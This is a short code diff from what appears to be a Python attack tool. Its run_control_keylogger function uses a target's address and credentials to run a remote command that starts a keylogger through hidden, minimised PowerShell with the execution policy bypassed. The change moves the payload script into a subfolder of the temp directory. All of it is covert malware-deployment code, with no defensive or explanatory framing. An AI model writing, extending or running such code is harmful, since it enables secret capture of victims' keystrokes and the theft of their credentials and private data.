@@ -79,7 +79,7 @@ def payloads(address, username, password, temp, startup):
 def run_control_keylogger(address, username, password, temp, startup):
     print("[*] Starting run control keylogger ...")
 
-    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {startup}/system.ps1"
+    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1"
 
     run_command(address, username, password, run_control)
     print("[+] Keylogger running ...")
